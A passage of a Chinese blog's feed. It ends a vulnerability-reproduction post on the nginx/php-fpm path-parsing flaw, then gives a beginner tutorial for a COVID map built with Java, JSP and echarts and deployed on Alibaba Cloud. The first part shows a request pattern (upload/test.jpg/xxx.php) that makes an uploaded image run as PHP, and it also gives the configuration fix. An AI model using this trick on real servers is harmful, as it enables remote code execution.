<code>fastcgi_param  SCRIPT_FILENAME</code> 就成了 <code>/../../upload/test.jpg</code> </p><p><img src="https://b3logfile.com/file/2020/11/image-37f7410c.png" alt="image.png"></p><p>所以访问 <code>http://192.168.73.146/upload/test.jpg/xxx.php</code> 实际上变成了 <code>http://192.168.73.146/upload/test.jpg</code> 并当成了php文件执行。</p><p>在是php-fpm.conf中的 <code>security.limit_extensions</code>配置了fastcgi解析文件的类型，如果默认为空那么是什么类型的文件就执行什么类型的文件。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li>将php.ini文件中的cgi.fix_pathinfo的值设置为0，这样它就不会修复路径，你访问xxx.php这个不存在的文件时就会显示此文件不存在。</li><li>php-fpm.conf中的security.limit_extensions后面的值设置为.php。</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="">https://blog.csdn.net/ll641058431/article/details/53350305</a></p><p><a href="https://www.laruence.com/2010/05/20/1495.html">https://www.laruence.com/2010/05/20/1495.html</a></p><p><a href="https://www.cnblogs.com/yuzly/p/11208742.html">https://www.cnblogs.com/yuzly/p/11208742.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpstudy </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>疫情地图_Demo</title>
      <link href="/posts/21594/"/>
      <url>/posts/21594/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>疫情期间的Demo，面向零基础，从代码编写到项目部署，在此记录一下学习过程，巩固一下知识。</p><p>使用到的工具如下</p><ul><li>IDEA</li><li>阿里云服务器</li></ul><h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><p>java代码编写，疫情期间网上公布着世界的人数感染情况，这些数据是从何而来？网易、丁香园这些数据并不是他们自己做出来的，而是通过实时收集数据，每个省上报的人数进行统计、汇总并进行公布。这时就有了固定的数据接口供大家使用，这种API接口挺多的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">package com.jh2ng.demo2;</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLConnection;</span><br><span class="line"></span><br><span class="line">public class Demo1 &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        //创建URL对象</span><br><span class="line">        URL u1 = new URL(&quot;https://zaixianke.com/yq/all&quot;); //调API</span><br><span class="line">        //建立连接</span><br><span class="line">        URLConnection con = u1.openConnection();</span><br><span class="line">        //获取数据流</span><br><span class="line">        InputStream is = con.getInputStream();</span><br><span class="line">        //读取输入流</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(is,&quot;utf-8&quot;));</span><br><span class="line">        //输出</span><br><span class="line">        String text = br.readLine();</span><br><span class="line">        System.out.println(text);</span><br><span class="line"></span><br><span class="line">        //关闭流</span><br><span class="line">        br.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出实例（部分）</p><p><img src="https://b3logfile.com/file/2020/11/image-ecad5c0a.png" alt="image.png"></p><p>数据既然拿到了，就需要在页面上展示我们所获取到的数据，也就是一个疫情地图，页面可以自行优化。</p><p>css样式代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line">var myChart = echarts.init(document.getElementById(&#x27;main&#x27;));</span><br><span class="line">function updateMap(num)&#123;</span><br><span class="line">$(&quot;.control&quot;).show();</span><br><span class="line">$(&quot;.control:eq(&quot;+num+&quot;)&quot;).hide();</span><br><span class="line">myChart.clear();</span><br><span class="line">var opt = null;</span><br><span class="line">switch(num)&#123;</span><br><span class="line">case 0:&#123;</span><br><span class="line">opt = &#123;</span><br><span class="line">        // 设置标题和副标题及副标题跳转链接</span><br><span class="line">        title: &#123;</span><br><span class="line">            text: &#x27;新冠疫情-国内累计数据&#x27;,</span><br><span class="line">            subtext: &#x27;数据来源--jh2ng&#x27;,</span><br><span class="line">            sublink: &#x27;https://www.jh2ing.com&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">        // 数据提示框</span><br><span class="line">        tooltip: &#123;</span><br><span class="line">            trigger: &#x27;item&#x27;, // item放到数据区域触发</span><br><span class="line">            formatter: function (params, ticket, callback) &#123;</span><br><span class="line">                if(params.data)</span><br><span class="line">                    return params.name+&#x27;&lt;br/&gt;&#x27;+params.data.value+&#x27; (人)&#x27;;</span><br><span class="line">                else</span><br><span class="line">                    return params.name+&#x27;&lt;br/&gt;无疫情信息&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        // 视觉映射方案:</span><br><span class="line">        // visualMap默认是连续映射，我们也可以设置为分段型，对于分布范围广的数据</span><br><span class="line">        // 使用透明度来区分疫情严重情况</span><br><span class="line">        visualMap: &#123;</span><br><span class="line">            type: &#x27;piecewise&#x27;,</span><br><span class="line">            pieces: [</span><br><span class="line">                &#123;gt: 2000, color: &#x27;darkred&#x27;&#125;,                        // (1500, Infinity]</span><br><span class="line">                &#123;gt: 1300, lte: 2000, color: &#x27;red&#x27;, colorAlpha: 1&#125;,  // (1000, 1500]</span><br><span class="line">                &#123;gt: 800, lte: 1300, color: &#x27;red&#x27;, colorAlpha: 0.8&#125;,</span><br><span class="line">                &#123;gt: 500, lte: 800, color: &#x27;red&#x27;, colorAlpha: 0.6&#125;,</span><br><span class="line">                &#123;gt: 200, lte: 500, color: &#x27;red&#x27;, colorAlpha: 0.4&#125;,</span><br><span class="line">                &#123;gt: 50, lte: 200, color: &#x27;red&#x27;, colorAlpha: 0.3&#125;,</span><br><span class="line">                &#123;lt: 50, color: &#x27;red&#x27;, colorAlpha: 0.2&#125;          // (-Infinity, 100)</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        // 具体数据</span><br><span class="line">        series: [</span><br><span class="line">            &#123;</span><br><span class="line">                name: &#x27;国内各省确诊病例&#x27;, // 系列名称</span><br><span class="line">                zoom:1.2,//地图大小</span><br><span class="line">                type: &#x27;map&#x27;, // 系列类型，地图</span><br><span class="line">                map: &#x27;china&#x27;, // 要使用的地图，即上面注册的地图名称</span><br><span class="line">                roam: true, // 开启鼠标缩放和平移漫游</span><br><span class="line">                label: &#123; // 图形上的文本标签，地图默认显示数据名</span><br><span class="line">                    show: true,</span><br><span class="line">                    formatter: &#x27;&#123;b&#125;&#x27;, // b是数据名，c是数据值</span><br><span class="line">                    fontSize: 8</span><br><span class="line">                &#125;,</span><br><span class="line">                data: data.data,</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">break;</span><br><span class="line">case 1:&#123;</span><br><span class="line">opt = &#123;</span><br><span class="line">        // 设置标题和副标题及副标题跳转链接</span><br><span class="line">        title: &#123;</span><br><span class="line">            text: &#x27;新冠疫情-国内新增数据&#x27;,</span><br><span class="line">            subtext: &#x27;数据来源--jh2ng&#x27;,</span><br><span class="line">            sublink: &#x27;https://www.jh2ing.com&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">        // 数据提示框</span><br><span class="line">        tooltip: &#123;</span><br><span class="line">            trigger: &#x27;item&#x27;, // item放到数据区域触发</span><br><span class="line">            formatter:  function (params, ticket, callback) &#123;</span><br><span class="line">                if(params.data)</span><br><span class="line">                    return params.name+&#x27;&lt;br/&gt;&#x27;+params.data.value+&#x27; (人)&#x27;;</span><br><span class="line">                else</span><br><span class="line">                    return params.name+&#x27;&lt;br/&gt;无疫情信息&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">// 视觉映射方案:</span><br><span class="line">        // visualMap默认是连续映射，我们也可以设置为分段型，对于分布范围广的数据</span><br><span class="line">        // 使用透明度来区分疫情严重情况</span><br><span class="line">        visualMap: &#123;</span><br><span class="line">            type: &#x27;piecewise&#x27;,</span><br><span class="line">            pieces: [</span><br><span class="line">                &#123;gt: 50, color: &#x27;darkred&#x27;&#125;,                        // (1500, Infinity]</span><br><span class="line">                &#123;gt: 30, lte: 50, color: &#x27;red&#x27;, colorAlpha: 1&#125;,  // (1000, 1500]</span><br><span class="line">                &#123;gt: 20, lte: 30, color: &#x27;red&#x27;, colorAlpha: 0.8&#125;,</span><br><span class="line">                &#123;gt: 10, lte: 20, color: &#x27;red&#x27;, colorAlpha: 0.6&#125;,</span><br><span class="line">                &#123;gt: 5, lte: 10, color: &#x27;red&#x27;, colorAlpha: 0.4&#125;,</span><br><span class="line">                &#123;gt: 1, lte: 5, color: &#x27;red&#x27;, colorAlpha: 0.3&#125;,</span><br><span class="line">                &#123;lt: 1, color: &#x27;red&#x27;, colorAlpha: 0.0&#125;          // (-Infinity, 100)</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        // 具体数据</span><br><span class="line">        series: [</span><br><span class="line">            &#123;</span><br><span class="line">                name: &#x27;国内各省确诊病例&#x27;, // 系列名称</span><br><span class="line">                zoom:1.2,//地图大小</span><br><span class="line">                type: &#x27;map&#x27;, // 系列类型，地图</span><br><span class="line">                map: &#x27;china&#x27;, // 要使用的地图，即上面注册的地图名称</span><br><span class="line">                roam: true, // 开启鼠标缩放和平移漫游</span><br><span class="line">                label: &#123; // 图形上的文本标签，地图默认显示数据名</span><br><span class="line">                    show: true,</span><br><span class="line">                    formatter: &#x27;&#123;b&#125;&#x27;, // b是数据名，c是数据值</span><br><span class="line">                    fontSize: 8</span><br><span class="line">                &#125;,</span><br><span class="line">                data: data.today,</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">break;</span><br><span class="line">case 2:&#123;</span><br><span class="line">opt = &#123;</span><br><span class="line">    // 设置标题和副标题及副标题跳转链接</span><br><span class="line">    title: &#123;</span><br><span class="line">      text: &#x27;新冠疫情-全球累计数据&#x27;,</span><br><span class="line">      subtext: &#x27;数据来源--jh2ng&#x27;,</span><br><span class="line">      sublink: &#x27;https://www.jh2ing.com&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    // 数据提示框</span><br><span class="line">    tooltip: &#123;</span><br><span class="line">      trigger: &#x27;item&#x27;, // item放到数据区域触发</span><br><span class="line">      //formatter: &#x27;&#123;b&#125;&lt;br/&gt;&#123;c&#125; (人)&#x27; // 提示数据格式br表示换行，地图 : &#123;a&#125;（系列名称），&#123;b&#125;（区域名称），&#123;c&#125;（合并数值）, &#123;d&#125;（无）</span><br><span class="line">      formatter:function (params, ticket, callback) &#123;</span><br><span class="line">        if(params.data)</span><br><span class="line">          return params.name+&#x27;&lt;br/&gt;&#x27;+params.data.value+&#x27; (人)&#x27;;</span><br><span class="line">        else</span><br><span class="line">          return params.name+&#x27;&lt;br/&gt; 未公布感染人数&#x27;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    // 视觉映射方案1：,疫情颜色根据传染病疫情等级分类为5个级别：黄色-橙色-深橙色-红色-深红色</span><br><span class="line">    // 为了是视觉分布更好，可以添加更多的颜色范围，然后适当调小max的值，因为美国和其它国家相差太大</span><br><span class="line">    /**/</span><br><span class="line">    visualMap: &#123;</span><br><span class="line">      min: 1, // 颜色映射对应的最小值，即对应下面的lightskyblue</span><br><span class="line">      max: 500000, // 颜色映射对应的最大值，即对应下面的orangered</span><br><span class="line">      text: [&#x27;严重&#x27;, &#x27;轻微&#x27;], // 映射图上下标记文本</span><br><span class="line">      realtime: true, // 是否显示拖拽手柄，映射条可以拖拽调整要映射的范围</span><br><span class="line">      calculable: true, // 拖拽时，是否实时更新地图</span><br><span class="line">      inRange: &#123;</span><br><span class="line">        color: [&#x27;rgba(222,0,0,0.2)&#x27;,&#x27;rgba(160,0,0,1)&#x27;] // 颜色映射范围，最小值，过渡值，最大值</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    // 具体数据</span><br><span class="line">    series: [</span><br><span class="line">      &#123;</span><br><span class="line">        name: &#x27;全球各国确诊病例&#x27;, // 系列名称</span><br><span class="line">        zoom:1.2,//地图大小</span><br><span class="line">        type: &#x27;map&#x27;, // 系列类型，地图</span><br><span class="line">        map: &#x27;world&#x27;, // 要使用的地图，即上面注册的地图名称</span><br><span class="line">        roam: true, // 开启鼠标缩放和平移漫游</span><br><span class="line">        label: &#123; // 图形上的文本标签，地图默认显示数据名</span><br><span class="line">          show: true,</span><br><span class="line">          fontSize:8,</span><br><span class="line">          //formatter: &#x27;&#123;b&#125;&#x27;, // b是数据名，c是数据值</span><br><span class="line">          formatter:function (params, ticket, callback) &#123;</span><br><span class="line">            //公布了数据 且 数据累计数据大于5万的显示国家名称</span><br><span class="line">            if(params.data &amp;&amp; params.data.value&gt;50000) &#123;</span><br><span class="line">              return params.name;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">              return &#x27;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        data: data.g_data,</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">break;</span><br><span class="line">case 3:&#123;</span><br><span class="line">opt = &#123;</span><br><span class="line">    // 设置标题和副标题及副标题跳转链接</span><br><span class="line">    title: &#123;</span><br><span class="line">      text: &#x27;新冠疫情-全球新增数据&#x27;,</span><br><span class="line">      subtext: &#x27;数据来源--jh2ng&#x27;,</span><br><span class="line">      sublink: &#x27;https://www.jh2ing.com&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    // 数据提示框</span><br><span class="line">    tooltip: &#123;</span><br><span class="line">      trigger: &#x27;item&#x27;, // item放到数据区域触发</span><br><span class="line">      formatter:function (params, ticket, callback) &#123;</span><br><span class="line">        if(params.data)</span><br><span class="line">          return params.name+&#x27;&lt;br/&gt;&#x27;+params.data.value+&#x27; (人)&#x27;;</span><br><span class="line">        else</span><br><span class="line">          return params.name+&#x27;&lt;br/&gt; 未公布感染人数&#x27;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    // 视觉映射方案1：,疫情颜色根据传染病疫情等级分类为5个级别：黄色-橙色-深橙色-红色-深红色</span><br><span class="line">    // 为了是视觉分布更好，可以添加更多的颜色范围，然后适当调小max的值，因为美国和其它国家相差太大</span><br><span class="line">    /**/</span><br><span class="line">    visualMap: &#123;</span><br><span class="line">      min: 0, // 颜色映射对应的最小值，</span><br><span class="line">      max: 20000, // 颜色映射对应的最大值</span><br><span class="line">      text: [&#x27;严重&#x27;, &#x27;轻微&#x27;], // 映射图上下标记文本</span><br><span class="line">      realtime: true, // 是否显示拖拽手柄，映射条可以拖拽调整要映射的范围</span><br><span class="line">      calculable: true, // 拖拽时，是否实时更新地图</span><br><span class="line">      inRange: &#123;</span><br><span class="line">        color: [&#x27;rgba(160,0,0,0)&#x27;,&#x27;rgba(160,0,0,1)&#x27;] // 颜色映射范围，最小值，过渡值，最大值</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    // 具体数据</span><br><span class="line">    series: [</span><br><span class="line">      &#123;</span><br><span class="line">        name: &#x27;全球各国新增病例&#x27;, // 系列名称</span><br><span class="line">        zoom:1.2,//地图大小</span><br><span class="line">        type: &#x27;map&#x27;, // 系列类型，地图</span><br><span class="line">        map: &#x27;world&#x27;, // 要使用的地图，即上面注册的地图名称</span><br><span class="line">        roam: true, // 开启鼠标缩放和平移漫游</span><br><span class="line">        label: &#123; // 图形上的文本标签，地图默认显示数据名</span><br><span class="line">          show: true,</span><br><span class="line">          fontSize:8,</span><br><span class="line">          //formatter: &#x27;&#123;b&#125;&#x27;, // b是数据名，c是数据值</span><br><span class="line">          formatter:function (params, ticket, callback) &#123;</span><br><span class="line">            //公布了数据 且 数据累计数据大于5万的显示国家名称</span><br><span class="line">            if(params.data &amp;&amp; params.data.value&gt;1000 || params.name == &#x27;中国&#x27;) &#123;</span><br><span class="line">              return params.name;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">              return &#x27;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        data: data.g_today,</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"> myChart.setOption(opt);</span><br><span class="line">&#125;</span><br><span class="line">updateMap(0);</span><br></pre></td></tr></table></figure><p>网页怎么进行数据展示？需要在一个网页里实时获取数据，html是静态的，写完之后页面固定。所以这里使用了能嵌套java代码的jsp来做这个,使用了echarts来做地图可视化，直接引入echarts.js，具体代码如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.net.URL&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.net.URLConnection&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;</span><br><span class="line">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;</span><br><span class="line">         pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;疫情地图&lt;/title&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        &lt;%</span><br><span class="line">        //创建URL对象</span><br><span class="line">        URL u1 = new URL(&quot;https://zaixianke.com/yq/all&quot;);</span><br><span class="line">        //建立连接</span><br><span class="line">        URLConnection con = u1.openConnection();</span><br><span class="line">        //获取数据流</span><br><span class="line">        InputStream is = con.getInputStream();</span><br><span class="line">        //读取输入流</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(is,&quot;utf-8&quot;));</span><br><span class="line">        //输出</span><br><span class="line">        String text = br.readLine();</span><br><span class="line">        //System.out.println(text);</span><br><span class="line"></span><br><span class="line">        //关闭流</span><br><span class="line">        br.close();</span><br><span class="line"></span><br><span class="line">         %&gt;</span><br><span class="line">        var data = &lt;%= text %&gt;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;https://cdn.bootcss.com/echarts/4.7.0/echarts.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;http://cdn.zaixianke.com/china.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;http://cdn.zaixianke.com/world.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;main&quot; style=&quot;width: 100%;height:600px;&quot;&gt;&lt;/div&gt; &lt;br&gt;</span><br><span class="line">&lt;div style=&quot;text-align:center&quot;&gt;</span><br><span class="line">    &lt;a style=&quot;color:#333&quot; class=&quot;control&quot; align=&quot;center&quot; href=&quot;javascript:updateMap(0)&quot;&gt;国内累计&lt;/a&gt;</span><br><span class="line">    &lt;a style=&quot;color:#333&quot; class=&quot;control&quot; align=&quot;center&quot; href=&quot;javascript:updateMap(1)&quot;&gt;国内新增&lt;/a&gt;</span><br><span class="line">    &lt;a style=&quot;color:#333&quot; class=&quot;control&quot; align=&quot;center&quot; href=&quot;javascript:updateMap(2)&quot;&gt;全球累计&lt;/a&gt;</span><br><span class="line">    &lt;a style=&quot;color:#333&quot; class=&quot;control&quot; align=&quot;center&quot; href=&quot;javascript:updateMap(3)&quot;&gt;全球新增&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script src=&quot;control.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>此Demo的代码就编写完了。通过java的URL工具类访问API，然后使用IO流读取数据再存入String类型的text，再通过JSP在web页面加载数据，最后通过echarts可视化输出疫情数据分布图。</p><h2 id="项目部署"><a href="#项目部署" class="headerlink" title="项目部署"></a>项目部署</h2><p>事出突然，心血来潮，手里没测试的服务器，本来想通过本地搭建的我想了一想还是算了，就选了阿里按时计费的来进行测试，来记录从购买到项目搭建的全过程吧。</p><ol><li>购买阿里云服务器，进入选择产品，<a href="https://www.aliyun.com/product/ecs?spm=5176.19720258.J_8058803260.13.10552c4aEauo6l">云服务器 ECS</a>，选择按量付费，配置自己选择即可，测试照着便宜的买就行了</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-bfd29516.png" alt="image.png"></p><ol start="2"><li>选择宝塔镜像，快速搭建，避免新手敲Linux命令。</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-a0cdae5e.png" alt="image.png"></p><ol start="3"><li>带宽拉满（自己选择），把80端口勾上，反正后面也要放行80端口，这里勾上简单、方便、节约时间。</li></ol><p><img src="file:///C:\Users\root\AppData\Local\Temp\ksohtml2004\wps1.jpg"><img src="https://b3logfile.com/file/2020/11/image-28b1bd4b.png" alt="image.png"></p><ol start="4"><li>设置密码，注意密码规则</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-479cc8cd.png" alt="image.png"></p><ol start="5"><li>设置资源释放时间，服务器按小时计费，会一直扣钱。购买成功之后转到控制台</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-27cdd824.png" alt="image.png"></p><ol start="6"><li>在实例中，操作栏点击配置规则，配置服务器的安全规则，宝塔默认端口为8888</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-6327d0ce.png" alt="image.png"></p><ol start="7"><li>登陆服务器，输入bt default，显示宝塔连接地址及一些信息，复制密码，因为第一次初始化要改密码。自己可以改用户名</li></ol><p><img src="https://b3logfile.com/file/2020/11/image-ce645550.png" 